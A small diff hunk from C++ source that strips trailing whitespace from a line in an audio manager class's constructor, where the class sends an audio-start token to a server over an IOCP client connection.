@@ -28,7 +28,7 @@ CAudioManager::CAudioManager(IOCPClient* ClientObject, int n):CManager(ClientObj
 	}
 
 	BYTE	bToken = TOKEN_AUDIO_START;
-	m_ClientObject->OnServerSending((char*)&bToken, 1);  
+	m_ClientObject->OnServerSending((char*)&bToken, 1);
 
 	WaitForDialogOpen();    //等待对话框打开
 	szPacket = NULL;
